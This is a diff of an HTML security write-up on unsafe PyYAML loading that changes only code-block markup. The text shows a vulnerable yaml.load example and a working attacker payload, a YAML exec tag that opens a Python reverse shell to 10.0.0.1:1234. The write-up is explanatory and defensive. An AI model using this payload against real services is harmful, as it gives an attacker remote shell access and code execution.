@@ -6,15 +6,13 @@
 <p>Wait, didn't pyyaml deprecate the unsafe loader?</p>
 <p>Not really- newer versions of pyyaml (5.1) will raise a <strong>warning</strong>, however many situations like web servers developers would not see this warning.</p>
 <h2>Example</h2>
-<p><code>python
-import yaml
+<pre><code class="python">import yaml
 with open(&#39;cfg.yaml&#39;) as cfg:
     config = yaml.load(cfg)
-</code></p>
+</code></pre>
 <p>Any attackers payload could look something like this:</p>
-<p><code>yaml
-!!python/object/apply:exec [&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;]
-</code></p>
+<pre><code class="yaml">!!python/object/apply:exec [&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;]
+</code></pre>
 <p>When deserialized, this would start a shell on TCP 10.0.0.1:1234.</p>
 <h2>Quick Fixes</h2>
 <ul>
